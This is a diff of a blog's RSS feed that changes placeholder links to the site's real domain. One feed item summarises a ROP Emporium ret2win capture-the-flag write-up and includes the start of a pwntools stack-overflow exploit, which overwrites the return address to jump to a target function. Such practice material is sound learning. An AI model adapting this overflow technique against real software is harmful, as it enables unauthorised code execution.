@@ -7,7 +7,7 @@
   xmlns:media="http://search.yahoo.com/mrss/">
   <channel>
     <title>Training on Fang Yuan</title>
-    <link>http://example.org/tags/training/</link>
+    <link>https://duythucne22.github.io/tags/training/</link>
     <description>Recent content in Training on Fang Yuan</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
@@ -16,17 +16,17 @@
     <copyright>©2024, All Rights Reserved</copyright>
     <lastBuildDate>Sat, 06 Nov 2021 00:00:00 +0000</lastBuildDate>
     
-        <atom:link href="http://example.org/tags/training/index.xml" rel="self" type="application/rss+xml" />
+        <atom:link href="https://duythucne22.github.io/tags/training/index.xml" rel="self" type="application/rss+xml" />
     
 
       
       <item>
         <title>Trainning ROP EMPORIUM</title>
-        <link>http://example.org/posts/rop-emporium/</link>
+        <link>https://duythucne22.github.io/posts/rop-emporium/</link>
         <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
         <author>hcdtdayneg@gmail.com (d.thuc)</author>
         <atom:modified>Sat, 06 Nov 2021 00:00:00 +0000</atom:modified>
-        <guid>http://example.org/posts/rop-emporium/</guid>
+        <guid>https://duythucne22.github.io/posts/rop-emporium/</guid>
         <description>Writeup — ROP Emporium Challenge 01: ret2win Our aim is overflow to control RIP.
 The input buffer is 32 bytes, but the input area allows 56 bytes. This allow overwriting the saved RBP and RIP.
 Exploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * p = process(&amp;#34;./ret2win&amp;#34;) elf = ELF(&amp;#34;./ret2win&amp;#34;) payload = &amp;#34;A&amp;#34; * 40 payload += p64(elf.symbols[&amp;#34;ret2win&amp;#34;]) open(&amp;#39;payload&amp;#39;, &amp;#39;w&amp;#39;).</description>
